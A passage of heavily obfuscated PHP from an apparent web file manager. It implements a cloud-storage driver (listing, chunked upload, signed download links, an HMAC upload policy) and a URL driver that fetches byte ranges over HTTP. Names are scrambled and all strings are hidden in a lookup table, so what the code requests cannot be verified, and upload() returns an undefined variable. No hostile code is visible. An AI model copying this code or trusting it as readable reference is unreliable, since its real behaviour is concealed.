$Ë×ìù‡¶); if (!$™†Ô´’É) { return !1; } $şê½‰’® = isset($™†Ô´’É[$ƒŞÇ¿ãì[1724]]) ? $™†Ô´’É[$ƒŞÇ¿ãì[1724]] : $ƒŞÇ¿ãì[12]; $­Ùß±Òû = isset($™†Ô´’É[$ƒŞÇ¿ãì[1725]]) ? $™†Ô´’É[$ƒŞÇ¿ãì[1725]] : array(); foreach ($­Ùß±Òû as $üÕşöÀÆ) { $ˆòĞÙÖ­ = $üÕşöÀÆ[$ƒŞÇ¿ãì[33]] == $ƒŞÇ¿ãì[78] ? !0 : !1; $†ı±ÃÚ = ltrim($½İ‚ïüı . $üÕşöÀÆ[$ƒŞÇ¿ãì[32]], $ƒŞÇ¿ãì[8]) . ($ˆòĞÙÖ­ ? $ƒŞÇ¿ãì[8] : $ƒŞÇ¿ãì[12]); $Ğø²®–ú = array($ƒŞÇ¿ãì[32] => $†ı±ÃÚ, $ƒŞÇ¿ãì[33] => $ˆòĞÙÖ­ ? $ƒŞÇ¿ãì[78] : $ƒŞÇ¿ãì[231], $ƒŞÇ¿ãì[79] => $üÕşöÀÆ[$ƒŞÇ¿ãì[413]], $ƒŞÇ¿ãì[1720] => $üÕşöÀÆ[$ƒŞÇ¿ãì[1726]]); $this->cacheMethodInfoSet($†ı±ÃÚ, $ˆòĞÙÖ­, $Ğø²®–ú); if ($ˆòĞÙÖ­) { $Åº•–È¯[] = $†ı±ÃÚ; if ($Î‚•ÓšÕ) { $this->fileList($†ı±ÃÚ, $Åº•–È¯, $«øô½Àˆ, $Î‚•ÓšÕ); } continue; } $«øô½Àˆ[] = $Ğø²®–ú; } if (count($­Ùß±Òû) < $Ë×ìù‡¶) { break; } } $this->cacheMethodInfoSet($åòï”¥´, !0); } public function listPath($×»‚ıÒÛ, $¦ªû‰Ùô = false) { $ïû–©«Ğ =& $_SERVER[€ä¾™²]; $¬¶ÌÍ± = $Û°Ë©… = array(); $this->fileList($×»‚ıÒÛ, $¬¶ÌÍ±, $Û°Ë©…); foreach ($¬¶ÌÍ± as $Äö¥”½€ => $µÁ©¹îæ) { $¬¶ÌÍ±[$Äö¥”½€] = $this->folderInfo($µÁ©¹îæ, $¦ªû‰Ùô); } foreach ($Û°Ë©… as $Äö¥”½€ => $µÁ©¹îæ) { $Û°Ë©…[$Äö¥”½€] = $this->fileInfo($µÁ©¹îæ[$ïû–©«Ğ[32]], $¦ªû‰Ùô, $µÁ©¹îæ); } return array($ïû–©«Ğ[85] => $¬¶ÌÍ±, $ïû–©«Ğ[86] => $Û°Ë©…); } public function has($ˆÆÓ‰Ó, $ƒÄœ£§ = false, $‚•Œ¶Ò¦ = true) { $§ÂĞ÷“ı =& $_SERVER[€ä¾™²]; $õ¦À­¬ê = $§ÂĞ÷“ı[12]; $ôÓıÜ‹¼ = 500; $ÁÓ†¡ÃÉ = 0; $îü¾œâ = 0; $ßÄ§Ä¨õ = rtrim($ˆÆÓ‰Ó, $§ÂĞ÷“ı[8]) . $§ÂĞ÷“ı[8]; while (!0) { check_abort(); $Ê¾Û—éÇ = $this->listObjs($ˆÆÓ‰Ó, $õ¦À­¬ê, $ôÓıÜ‹¼); if (!$Ê¾Û—éÇ) { return !1; } $õ¦À­¬ê = isset($Ê¾Û—éÇ[$§ÂĞ÷“ı[1724]]) ? $Ê¾Û—éÇ[$§ÂĞ÷“ı[1724]] : $§ÂĞ÷“ı[12]; $ÈñÊ¡Æõ = isset($Ê¾Û—éÇ[$§ÂĞ÷“ı[1725]]) ? $Ê¾Û—éÇ[$§ÂĞ÷“ı[1725]] : array(); if (empty($ÈñÊ¡Æõ)) { break; } $×Å™ö‘ = array_filter($ÈñÊ¡Æõ, function ($°µÀ¸­¾) { $¡—ââ–¨ =& $_SERVER[€ä¾™²]; return $°µÀ¸­¾[$¡—ââ–¨[33]] == $¡—ââ–¨[78]; }); $»Ôƒ¤« = count($ÈñÊ¡Æõ); $×Å™ö‘ = count($×Å™ö‘); $„Õ™›óÓ = $»Ôƒ¤« - $×Å™ö‘; if ($ƒÄœ£§) { $îü¾œâ += $×Å™ö‘; $ÁÓ†¡ÃÉ += $„Õ™›óÓ; if ($»Ôƒ¤« < $ôÓıÜ‹¼) { break; } continue; } if ($‚•Œ¶Ò¦) { if ($„Õ™›óÓ) { return !0; } } else { if ($×Å™ö‘) { return !0; } } if ($»Ôƒ¤« < $ôÓıÜ‹¼) { break; } } if ($ƒÄœ£§) { return array($§ÂĞ÷“ı[240] => $ÁÓ†¡ÃÉ, $§ÂĞ÷“ı[241] => $îü¾œâ); } return !1; } public function listAll($òÂºÑÖŸ) { $Ã¦÷«éÇ =& $_SERVER[€ä¾™²]; $¹—€ŒÌÃ = $½Î¾è¹³ = array(); $this->fileList($òÂºÑÖŸ, $¹—€ŒÌÃ, $½Î¾è¹³, !0); $ãÜ„İôİ = array_to_keyvalue($½Î¾è¹³, $Ã¦÷«éÇ[32]); foreach ($¹—€ŒÌÃ as $Û²´ÎÚÔ) { if (is_string($Û²´ÎÚÔ)) { $ãÜ„İôİ[$Û²´ÎÚÔ] = array($Ã¦÷«éÇ[79] => 0); } } return $this->listAllFiles($òÂºÑÖŸ, $ãÜ„İôİ); } public function canRead($´ÁëÕşÊ) { return $this->exist($´ÁëÕşÊ) ? !0 : !1; } public function canWrite($Îˆñä¸®) { return $this->exist($Îˆñä¸®) ? !0 : !1; } public function getContent($É¿±ùİ) { return $this->fileSubstr($É¿±ùİ, 0, -1); } public function setContent($ÄàÚÅ›, $“õŒ‡‘Ú = '') { $É¯¤íæ =& $_SERVER[€ä¾™²]; if (!$“õŒ‡‘Ú) { $§¯±õ‡Ç = $this->ussRequest($ÄàÚÅ›, $É¯¤íæ[289]); return $§¯±õ‡Ç[$É¯¤íæ[1346]]; } $óğÚ™ë‚ = $this->tempFile($this->pathThis($ÄàÚÅ›)); file_put_contents($óğÚ™ë‚, $“õŒ‡‘Ú); if ($this->upload($ÄàÚÅ›, $óğÚ™ë‚)) { $this->tempFileRemve($óğÚ™ë‚); return !0; } return !1; } public function fileSubstr($©ûÌ¨Ğ©, $Ş¨É¼“£, $‡†×‰£) { $Ó¾¹Ó¤ä =& $_SERVER[€ä¾™²]; if (!($ÙçÓÁªÆ = $this->link($©ûÌ¨Ğ©))) { return !1; } $ë¦¿ï« = !1; if ($‡†×‰£ > 0) { $ÊÆçñ¢« = $Ş¨É¼“£ + $‡†×‰£ - 1; $ë¦¿ï« = array($Ó¾¹Ó¤ä[1551] . $Ş¨É¼“£ . $Ó¾¹Ó¤ä[476] . $ÊÆçñ¢«); } $½ËËÍ¡ó = url_request($ÙçÓÁªÆ, $Ó¾¹Ó¤ä[1552], !1, $ë¦¿ï«); return $½ËËÍ¡ó[$Ó¾¹Ó¤ä[850]] ? $½ËËÍ¡ó[$Ó¾¹Ó¤ä[1336]] : !1; } public function upload($Àì™ûÚæ, $àÌ§õ², $£“¯ÃÃ  = false, $½ãˆ¨éâ = REPEAT_REPLACE) { $­ÂÙ¬ê´ =& $_SERVER[€ä¾™²]; if (!$àÌ§õ² || !@file_exists($àÌ§õ²)) { return !1; } $”öü²¬¦ = IO::size($àÌ§õ²); if ($”öü²¬¦ <= 1024 * 1024 * 200) { $ÀÄêï£¥ = array($­ÂÙ¬ê´[1727] . $àÌ§õ²); $½ö—·¸Û = $this->ussRequest($Àì™ûÚæ, $­ÂÙ¬ê´[254], $ÀÄêï£¥); return $½ö—·¸Û[$­ÂÙ¬ê´[1346]] ? $this->getPathOuter($Àì™ûÚæ) : !1; } $‚·ÎÚ¨¿ = 1024 * 1024 * 10; $åİ¤ú‚ = array($­ÂÙ¬ê´[1728], $­ÂÙ¬ê´[1729] . $”öü²¬¦, $­ÂÙ¬ê´[1730], $­ÂÙ¬ê´[1731] . $‚·ÎÚ¨¿); $½ö—·¸Û = $this->ussRequest($Àì™ûÚæ, $­ÂÙ¬ê´[254], !1, $åİ¤ú‚); if (!$½ö—·¸Û[$­ÂÙ¬ê´[1346]]) { return !1; } $·¹ö²Äµ = $½ö—·¸Û[$­ÂÙ¬ê´[1336]]; $õ“˜šª = 0; $¨µ•Á°¯ = $·¹ö²Äµ[$­ÂÙ¬ê´[1732]]; $şÑ“ˆøË = fopen($àÌ§õ², $­ÂÙ¬ê´[1612]); if (!$şÑ“ˆøË) { return !1; } do { $ÓÊÇ¹Ü = $·¹ö²Äµ[$­ÂÙ¬ê´[1733]]; fseek_64($şÑ“ˆøË, $õ“˜šª); $©¹óÖ­ = fread($şÑ“ˆøË, $ÓÊÇ¹Ü); $Ááğã— = 0; do { $Ááğã—++; $·¹ö²Äµ = $this->uploadPart($Àì™ûÚæ, $·¹ö²Äµ, $©¹óÖ­); } while (!$·¹ö²Äµ && $Ááğã— < 3); if (!$·¹ö²Äµ) { return !1; } $¨µ•Á°¯ = $·¹ö²Äµ[$­ÂÙ¬ê´[1732]]; $õ“˜šª += $ÓÊÇ¹Ü; } while ($¨µ•Á°¯ != -1); fclose($şÑ“ˆøË); $åİ¤ú‚ = array($­ÂÙ¬ê´[1734], $­ÂÙ¬ê´[1735] . $·¹ö²Äµ[$­ÂÙ¬ê´[1736]], $­ÂÙ¬ê´[1730]); $½ö—·¸Û = $this->ussRequest($Àì™ûÚæ, $­ÂÙ¬ê´[254], !1, $åİ¤ú‚); return $½ö—·¸Û[$­ÂÙ¬ê´[1346]] ? $this->getPathOuter($–äóìˆ) : !1; } private function uploadPart($™îË“œ, $àâ º„«, &$–œæÂ°­) { $ùã±¡Áï =& $_SERVER[€ä¾™²]; $¼ƒì³¯Ó = array($ùã±¡Áï[1737], $ùã±¡Áï[1735] . $àâ º„«[$ùã±¡Áï[1736]], $ùã±¡Áï[1738] . $àâ º„«[$ùã±¡Áï[1732]], $ùã±¡Áï[144] . $àâ º„«[$ùã±¡Áï[1733]]); $î…ºƒ„˜ = $this->ussRequest($™îË“œ, $ùã±¡Áï[254], $–œæÂ°­, $¼ƒì³¯Ó); return !$î…ºƒ„˜[$ùã±¡Áï[1346]] ? $î…ºƒ„˜[$ùã±¡Áï[1346]] : $î…ºƒ„˜[$ùã±¡Áï[1336]]; } public function uploadFormData($¾Ö°Í“ª, $ÅÓ®ÒÄà = 3600) { return $this->uploadPolicy($¾Ö°Í“ª, $ÅÓ®ÒÄà); } public function uploadMultiData($ŞÁÑ‘İ², $íÂı÷Ù© = 3600) { $Æ¶ù¾§ú =& $_SERVER[€ä¾™²]; $î¯ã©¦Ë = (int) $GLOBALS[$Æ¶ù¾§ú[7]][$Æ¶ù¾§ú[79]]; return $this->uploadPolicy($ŞÁÑ‘İ², $íÂı÷Ù©, $î¯ã©¦Ë); } private function uploadPolicy($İóª«­, $Ïæíâ÷± = 3600, $Ã²ğê÷… = 0) { $¹£º„÷ş =& $_SERVER[€ä¾™²]; $ ¾‡Â° = $¹£º„÷ş[8] . $this->bucket; $¶Øšıâ¾ = gmdate($¹£º„÷ş[1647]); $Œª§şûæ = array($¹£º„÷ş[1739] => $this->bucket, $¹£º„÷ş[1740] => $İóª«­, $¹£º„÷ş[1741] => time() + $Ïæíâ÷±, $¹£º„÷ş[1742] => $¶Øšıâ¾); if ($Ã²ğê÷…) { $Œª§şûæ[$¹£º„÷ş[1632]] = $Ã²ğê÷…; } $×æöâç = base64_encode(json_encode($Œª§şûæ)); $·ïÜ™ø½ = base64_encode(hash_hmac($¹£º„÷ş[1696], "\120\117\123\124\x26{$ ¾‡Â°}\46{$¶Øšıâ¾}\46{$×æöâç}", md5("{$this->userpass}"), !0)); $’ĞŒÎ™® = array($¹£º„÷ş[278] => $×æöâç, $¹£º„÷ş[1743] => "\x55\120\x59\x55\x4e\40{$this->username}\x3a{$·ïÜ™ø½}", $¹£º„÷ş[207] => $this->endpoint . $ ¾‡Â°); return $’ĞŒÎ™®; } public function download($øŸÍú•°, $Šü×ş») { $ñï¿åÉÅ = IO::getPathInner(IO::mkfile($Šü×ş»)); if (!($ğ„®ğ = $this->link($øŸÍú•°))) { return !1; } $²„ìÀ²á = 0; $ê¥èë˜» = 1024 * 200; $òæ»ö‹» = fopen($ñï¿åÉÅ, $_SERVER[€ä¾™²][1691]); while (!0) { $¯†¾š–° = $this->fileSubstr($øŸÍú•°, $²„ìÀ²á, $ê¥èë˜»); if ($¯†¾š–° === !1) { return !1; } fwrite($òæ»ö‹», $¯†¾š–°); $²„ìÀ²á += $ê¥èë˜»; if (strlen($¯†¾š–°) < $ê¥èë˜») { break; } } fclose($òæ»ö‹»); return $Šü×ş»; } public function link($á½×Ÿ™û, $«¤ğÀ»š = array()) { $ÔËÊ‹Òˆ =& $_SERVER[€ä¾™²]; $á½×Ÿ™û = trim($á½×Ÿ™û, $ÔËÊ‹Òˆ[8]); if (!empty($this->token)) { $ùæÉÆ± = strtotime(date($ÔËÊ‹Òˆ[1744])); $çÖŠşÌÍ = substr(md5($this->token . $ÔËÊ‹Òˆ[285] . $ùæÉÆ± . $ÔËÊ‹Òˆ[1745] . $á½×Ÿ™û), 12, 8) . $ùæÉÆ±; $«¤ğÀ»š[] = $ÔËÊ‹Òˆ[1746] . $çÖŠşÌÍ; } $õÁœ’× = !empty($«¤ğÀ»š) ? $ÔËÊ‹Òˆ[76] . implode($ÔËÊ‹Òˆ[285], $«¤ğÀ»š) : $ÔËÊ‹Òˆ[12]; return $this->getHost() . $ÔËÊ‹Òˆ[8] . $this->pathEncode($á½×Ÿ™û) . $õÁœ’×; } public function fileOut($â©¦Ë§Œ, $££å…İæ = false, $á÷ï¿› = false, $”Î´ˆ ¯ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($â©¦Ë§Œ, $££å…İæ, $á÷ï¿›, $”Î´ˆ ¯); } if (!$á÷ï¿›) { $á÷ï¿› = $this->pathThis($â©¦Ë§Œ); } $û¨ù½ = $££å…İæ ? array($_SERVER[€ä¾™²][1747] . rawurlencode($á÷ï¿›)) : array(); $µí¡ïÅÉ = $this->link($â©¦Ë§Œ, $û¨ù½); $this->fileOutLink($µí¡ïÅÉ); } public function fileOutServer($Çüğ®ó¥, $óƒ“£à« = false, $åüïÓœ = false, $üÕ’õêã = '') { parent::fileOut($Çüğ®ó¥, $óƒ“£à«, $åüïÓœ, $üÕ’õêã); } public function fileOutImage($ÙŒ‡×Œ„, $™é£üèñ = 250) { $úÚï ®ƒ = $this->link($ÙŒ‡×Œ„ . $_SERVER[€ä¾™²][1748] . $™é£üèñ); $this->fileOutLink($úÚï ®ƒ); } public function fileOutImageServer($‰ñ¶«şë, $°ô«Õîô = 250) { parent::fileOutImage($‰ñ¶«şë, $°ô«Õîô); } public function hashMd5($·©µ¶Œ‘) { $´ÀèÕ·˜ =& $_SERVER[€ä¾™²]; $ü¶Õ¼» = $this->_objectMeta($·©µ¶Œ‘); return isset($ü¶Õ¼»[$´ÀèÕ·˜[246]]) ? $ü¶Õ¼»[$´ÀèÕ·˜[246]] : !1; } public function size($é°ÀÃ¾ò) { $É¦¾¢Áˆ = $this->objectMeta($é°ÀÃ¾ò); return $É¦¾¢Áˆ ? $É¦¾¢Áˆ[$_SERVER[€ä¾™²][79]] : 0; } public function info($Í”Å×£œ) { if ($this->isFolder($Í”Å×£œ)) { return $this->folderInfo($Í”Å×£œ); } else { if ($this->isFile($Í”Å×£œ)) { return $this->fileInfo($Í”Å×£œ); } } return !1; } public function exist($“ŒâÏ¦Š) { return $this->isFile($“ŒâÏ¦Š) || $this->isFolder($“ŒâÏ¦Š); } public function isFile($Å¨ÉŠéš) { return !$this->isFolder($Å¨ÉŠéš) && $this->objectMeta($Å¨ÉŠéš); } public function isFolder($³Û¤ú‰) { return $this->cacheMethod($_SERVER[€ä¾™²][178], $³Û¤ú‰); } protected function objectMeta($ìöÑÅ€) { return $this->cacheMethod($_SERVER[€ä¾™²][180], $ìöÑÅ€); } protected function _objectMeta($Ô¦¤êÏ¬) { $ÄĞ†ôÒ¼ =& $_SERVER[€ä¾™²]; if ($Ô¦¤êÏ¬ == $ÄĞ†ôÒ¼[12] || $Ô¦¤êÏ¬ == $ÄĞ†ôÒ¼[8]) { return array(); } $ëèšó€ = $this->ussRequest($Ô¦¤êÏ¬, $ÄĞ†ôÒ¼[1749]); if (!$ëèšó€[$ÄĞ†ôÒ¼[1346]]) { return null; } $¤Ö„ùòä = isset($ëèšó€[$ÄĞ†ôÒ¼[1336]]) ? $ëèšó€[$ÄĞ†ôÒ¼[1336]] : array(); if (!isset($¤Ö„ùòä[$ÄĞ†ôÒ¼[1750]])) { return null; } $—Şßû¦ = array($ÄĞ†ôÒ¼[33] => isset($¤Ö„ùòä[$ÄĞ†ôÒ¼[1750]]) ? $¤Ö„ùòä[$ÄĞ†ôÒ¼[1750]] : null, $ÄĞ†ôÒ¼[79] => isset($¤Ö„ùòä[$ÄĞ†ôÒ¼[1751]]) ? $¤Ö„ùòä[$ÄĞ†ôÒ¼[1751]] : null, $ÄĞ†ôÒ¼[246] => isset($¤Ö„ùòä[$ÄĞ†ôÒ¼[1752]]) ? $¤Ö„ùòä[$ÄĞ†ôÒ¼[1752]] : null, $ÄĞ†ôÒ¼[1719] => isset($¤Ö„ùòä[$ÄĞ†ôÒ¼[1753]]) ? $¤Ö„ùòä[$ÄĞ†ôÒ¼[1753]] : null); $—Şßû¦[$ÄĞ†ôÒ¼[1720]] = isset($¤Ö„ùòä[$ÄĞ†ôÒ¼[1754]]) ? strtotime($¤Ö„ùòä[$ÄĞ†ôÒ¼[1754]]) : $—Şßû¦[$ÄĞ†ôÒ¼[1719]]; return $—Şßû¦; } protected function _isFolder($£¬ƒİÈØ) { $ü®Ñ³°  =& $_SERVER[€ä¾™²]; if ($£¬ƒİÈØ == $ü®Ñ³° [12] || $£¬ƒİÈØ == $ü®Ñ³° [8]) { return !0; } $°Ÿï–ş = $this->_objectMeta($£¬ƒİÈØ); return isset($°Ÿï–ş[$ü®Ñ³° [33]]) && $°Ÿï–ş[$ü®Ñ³° [33]] == $ü®Ñ³° [78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($İ£»ó´û = false) { } public function exist($â¸ƒ…Ê“) { $ê®îı‘ = $this->info($â¸ƒ…Ê“); return $ê®îı‘[$_SERVER[€ä¾™²][233]]; } public function isFile($øç†ÇÑ×) { $¿úƒè©¨ = $this->info($øç†ÇÑ×); return $¿úƒè©¨[$_SERVER[€ä¾™²][233]]; } public function isFolder($§Èî…Ş ) { return !1; } public function size($¾èÏ­˜…) { $³€ÊèğÂ = $this->info($¾èÏ­˜…); return $³€ÊèğÂ[$_SERVER[€ä¾™²][79]]; } public function info($ç¸ ö£Ï) { return $this->infoParse($ç¸ ö£Ï); } public function infoAuth($Š…¤íì) { return $this->infoParse($Š…¤íì); } public function infoWithChildren($Ÿçéìğç) { return $this->infoParse($Ÿçéìğç); } public function infoFull($ê–¿÷Û) { return $this->infoParse($ê–¿÷Û); } private function infoParse($ï‚†Å€) { $ ·à²Íé =& $_SERVER[€ä¾™²]; $æ†éˆÔ¯ = $this->header($ï‚†Å€); if (!$æ†éˆÔ¯ || !$æ†éˆÔ¯[$ ·à²Íé[850]]) { return !1; } $¡¥è€ = _get($æ†éˆÔ¯, $ ·à²Íé[413], 0); $Æ‚‰˜Ö¾ = array($ ·à²Íé[32] => $æ†éˆÔ¯[$ ·à²Íé[32]], $ ·à²Íé[87] => $ï‚†Å€, $ ·à²Íé[33] => $ ·à²Íé[231], $ ·à²Íé[79] => intval($¡¥è€), $ ·à²Íé[167] => get_path_ext($æ†éˆÔ¯[$ ·à²Íé[32]]), $ ·à²Íé[1609] => $¡¥è€ > 0 && $æ†éˆÔ¯[$ ·à²Íé[1755]], $ ·à²Íé[1610] => !1); return $Æ‚‰˜Ö¾; } private function header($é›ƒ˜“£) { $ÒÙ¶³ºØ =& $_SERVER[€ä¾™²]; if (isset(self::$_cacheHeader[$é›ƒ˜“£])) { return self::$_cacheHeader[$é›ƒ˜“£]; } $—â¡Ä¬¬ = isset($GLOBALS[$ÒÙ¶³ºØ[1756]]) ? $GLOBALS[$ÒÙ¶³ºØ[1756]] : !1; $GLOBALS[$ÒÙ¶³ºØ[1756]] = !0; self::$_cacheHeader[$é›ƒ˜“£] = url_header($é›ƒ˜“£); $GLOBALS[$ÒÙ¶³ºØ[1756]] = $—â¡Ä¬¬; return self::$_cacheHeader[$é›ƒ˜“£]; } public function hashSimple($´ä­›úï, $èşˆµÃ = false) { $Ç±÷€š¤ =& $_SERVER[€ä¾™²]; $ªæ¬ÀÕŠ = $this->info($´ä­›úï); if (!$ªæ¬ÀÕŠ || !$ªæ¬ÀÕŠ[$Ç±÷€š¤[233]]) { return !1; } $ºëı“Å = $ªæ¬ÀÕŠ[$Ç±÷€š¤[79]]; $ÈƒôÀ¾Ş = 200; $§¦êîÈ´ = 50; if ($ºëı“Å <= $ÈƒôÀ¾Ş * $§¦êîÈ´) { return md5($this->fileSubstr($´ä­›úï, 0, $ºëı“Å)) . $ºëı“Å; } $Ûå¶õîî = intval($ºëı“Å / $§¦êîÈ´); $ÛÃ£àƒ = $Ç±÷€š¤[12]; $¿×ƒ¢Ô = timeFloat(); $Á™¸Ë’€ = 15; for ($õËòÏ÷“ = 0; $õËòÏ÷“ < $§¦êîÈ´; $õËòÏ÷“++) { if (timeFloat() - $¿×ƒ¢Ô > $Á™¸Ë’€) { return !1; } $ï¶Â¯·µ = $this->fileSubstr($´ä­›úï, $Ûå¶õîî * $õËòÏ÷“, $ÈƒôÀ¾Ş); if (!$ï¶Â¯·µ) { return !1; } $ÛÃ£àƒ .= $ï¶Â¯·µ; } $ÛÃ£àƒ .= $this->fileSubstr($´ä­›úï, $ºëı“Å - $ÈƒôÀ¾Ş, $ÈƒôÀ¾Ş); return md5($ÛÃ£àƒ) . $ºëı“Å; } public function getContent($—Ëùğëû) { return $this->fileSubstr($—Ëùğëû); } public function fileSubstr($„Š¯áõö, $˜½íõĞ = 0, $Ğßš–Î” = -1) { $¤Ö—•á =& $_SERVER[€ä¾™²]; $ú‘„§¢Û = $this->info($„Š¯áõö); if (!$ú‘„§¢Û || !$ú‘„§¢Û[$¤Ö—•á[233]] && $ú‘„§¢Û[$¤Ö—•á[79]] > 1024 * 1024 * 10) { return !1; } if ($Ğßš–Î” === -1) { $Ğßš–Î” = $ú‘„§¢Û[$¤Ö—•á[79]]; } if ($Ğßš–Î” == 0) { return $¤Ö—•á[12]; } $©¸óáÏ = array($¤Ö—•á[1757] . $˜½íõĞ . $¤Ö—•á[889] . ($˜½íõĞ + $Ğßš–Î” - 1)); $¢ß¾­Í = url_request($„Š¯áõö, $¤Ö—•á[1552], !1, $©¸óáÏ, !1, !1, 30); return $¢ß¾­Í[$¤Ö—•á[1336]] ? $¢ß¾­Í[$¤Ö—•á[1336]] : $¤Ö—•á[12]; } public function download($Ô±½¶ğ³, $Ü¦‹ÓÍî) { Downloader::start($Ô±½¶ğ³, $Ü¦‹ÓÍî); return $Ü¦‹ÓÍî; } } goto Fó«¤ÔÙÒà; D®Ä¿‹‚˜’: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¡â‰„´ü =& $_SERVER[€ä¾™²]; $this->objectDriver = array($¡â‰„´ü[60], $¡â‰„´ü[61], $¡â‰„´ü[62], $¡â‰„´ü[63], $¡â‰„´ü[64], $¡â‰„´ü[65], $¡â‰„´ü[66], $¡â‰„´ü[67], $¡â‰„´ü[68], $¡â‰„´ü[69], $¡â‰„´ü[70], $¡â‰„´ü[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($½¤—¯») { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($½¤—¯», $_SERVER[€ä¾™²][8]); } return $½¤—¯»; } public function iconvApp($ëÁªË) { return $ëÁªË; } public function iconvSystem($íåœôà) { return $íåœôà; } public function iconvTo($öúìÆˆ…, $®’÷­À, $›Êïâ¯³) { $Á“÷áÂ‘ =& $_SERVER[€ä¾™²]; if (!$öúìÆˆ… || !function_exists($Á“÷áÂ‘[72])) { return $öúìÆˆ…; } static $‡ÏÚ§­ = array(); $¯ü±¿¨ = $®’÷­À . $Á“÷áÂ‘[73] . $›Êïâ¯³ . $Á“÷áÂ‘[74] . $öúìÆˆ…; if (isset($‡ÏÚ§­[$¯ü±¿¨])) { return $‡ÏÚ§­[$¯ü±¿¨]; } if (function_exists($Á“÷áÂ‘[75])) { $¦ßîî€… = @mb_convert_encoding($öúìÆˆ…, $›Êïâ¯³, $®’÷­À); } else { $¦ßîî€… = @iconv($®’÷­À, $›Êïâ¯³, $öúìÆˆ…); } $¦ßîî€… = $¦ßîî€… ? $¦ßîî€… : $öúìÆˆ…; if (strstr($¦ßîî€…, $Á“÷áÂ‘[76])) { $¦ßîî€… = str_replace($Á“÷áÂ‘[76], $Á“÷áÂ‘[11], $¦ßîî€…); } $‡ÏÚ§­[$®’÷­À . $Á“÷áÂ‘[73] . $›Êïâ¯³ . $Á“÷áÂ‘[74] . $öúìÆˆ…] = $¦ßîî€…; $‡ÏÚ§­[$›Êïâ¯³ . $Á“÷áÂ‘[73] . $®’÷­À . $Á“÷áÂ‘[74] . $öúìÆˆ…] = $öúìÆˆ…; $‡ÏÚ§­[$›Êïâ¯³ . $Á“÷áÂ‘[73] . $®’÷­À . $Á“÷áÂ‘[74] . $¦ßîî€…] = $öúìÆˆ…; $‡ÏÚ§­[$®’÷­À . $Á“÷áÂ‘[73] . $›Êïâ¯³ . $Á“÷áÂ‘[74] . $¦ßîî€…] = $¦ßîî€…; return $¦ßîî€…; } public function getPathInner($¡ºË½êÔ) { $è«©â¸² = IO::init($¡ºË½êÔ); return $è«©â¸²->path; } public function getPathOuter($ó»è£°) { $šÚœÄ†œ =& $_SERVER[€ä¾™²]; $±ÃÆ¦îš = strlen(trim($this->pathBase, $šÚœÄ†œ[8])); $ó»è£° = substr(trim($ó»è£°, $šÚœÄ†œ[8]), $±ÃÆ¦îš); return $this->pathDriver . $šÚœÄ†œ[8] . ltrim($ó»è£°, $šÚœÄ†œ[8]); } public function isParentOf($‡Ÿ©Ã½„, $‡”­Ø¢Ğ) { $ÁÁ·«ŒÈ =& $_SERVER[€ä¾™²]; $‡Ÿ©Ã½„ = rtrim(strtolower($‡Ÿ©Ã½„), $ÁÁ·«ŒÈ[8]) . $ÁÁ·«ŒÈ[8]; $‡”­Ø¢Ğ = rtrim(strtolower($‡”­Ø¢Ğ), $ÁÁ·«ŒÈ[8]) . $ÁÁ·«ŒÈ[8]; $¥ÆÎ™ğÅ = strpos($‡”­Ø¢Ğ, $‡Ÿ©Ã½„) === 0; return $¥ÆÎ™ğÅ; } public function getType() { $‡ãï‘üü =& $_SERVER[€ä¾™²]; $øÎóÏ = str_replace($‡ãï‘üü[77], $‡ãï‘üü[12], get_class($this)); return strtolower($øÎóÏ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($§¾áë…Ğ, $Ğ†é×•€) { $™¬Ğ ı =& $_SERVER[€ä¾™²]; $¥®ÅûÁ = rtrim($§¾áë…Ğ, $™¬Ğ ı[8]) . $™¬Ğ ı[8] . $Ğ†é×•€; $½“Ä—Á = $this->exist($¥®ÅûÁ); return $½“Ä—Á ? $¥®ÅûÁ : !1; } public function setModifyTime($Ê¬ÃÊöä, $êÊ§â = '') { } public function renameObject($™Š­Ì÷È, $¾øªä‡÷) { $¸ùÚˆ«Ü = $¾øªä‡÷; $™Š­Ì÷È = $this->getPathOuter($™Š­Ì÷È); $¾øªä‡÷ = $this->pathFather($™Š­Ì÷È) . $¾øªä‡÷; $ŠìÒ¤Ø„ = IO::copy($™Š­Ì÷È, $this->pathFather($™Š­Ì÷È), REPEAT_RENAME_FOLDER, $¸ùÚˆ«Ü); if ($ŠìÒ¤Ø„) { IO::remove($™Š­Ì÷È); } return $ŠìÒ¤Ø„ ? $¾øªä‡÷ : !1; } public function tempFile($‡—öúĞÉ = '', $ê‰¼§† = '') { if (!$‡—öúĞÉ) { $‡—öúĞÉ = rand_string(15); } $ß§©›ıæ = TEMP_FILES . rand_string(15) . $_SERVER[€ä¾™²][8]; @mkdir($ß§©›ıæ, DEFAULT_PERRMISSIONS, !0); $¤Â„Ñµ˜ = $ß§©›ıæ . $‡—öúĞÉ; @touch($¤Â„Ñµ˜); if ($ê‰¼§†) { file_put_contents($¤Â„Ñµ˜, $ê‰¼§†); } return $¤Â„Ñµ˜; } public function tempFileRemve($È»Š¾Õ) { @unlink($È»Š¾Õ); @rmdir($this->pathFather($È»Š¾Õ)); } public function mkfile($ÏÈ·ÚÖ™, $ø–˜üÈ‘ = '', $Ûù§ˆ×€ = REPEAT_RENAME) { } public function mkdir($É¾ŸÉğØ, $ìÉÂ®– = REPEAT_SKIP) { } public function delFile($óõÔ€ø) { } public function delFolder($š¿ŠìÉË) { } public function copyFile($ıØÓîÊá, $“…¬¼Ó) { } public function moveFile($ø £¤÷¶, $üáÌ¹Î‹) { } public function remove($Û‹À¹¡Ò) { if ($this->isFile($Û‹À¹¡Ò)) { return $this->delFile($Û‹À¹¡Ò); } return $this->delFolder($Û‹À¹¡Ò); } public function rename($âÛ¾ûûğ, $èºé³şß) { } public function exist($˜±óªï¾) { } public function isFile($Ş¨¦«•Ş) { } public function isFolder($„Ú˜Ïíü) { } public function size($±ü­á¯) { } public function info($Å–è…½é) { } public function infoSimple($ì»£¢Ó) { return $this->info($ì»£¢Ó); } public function infoAuth($ñ×îÅ½†) { return $this->info($ñ×îÅ½†); } public function infoFull($¶îä£àï) { return $this->info($¶îä£àï); } public function infoFullSimple($ÁÕƒ×Ö) { return $this->info($ÁÕƒ×Ö); } public function infoWithChildren($×û¨ƒ) { 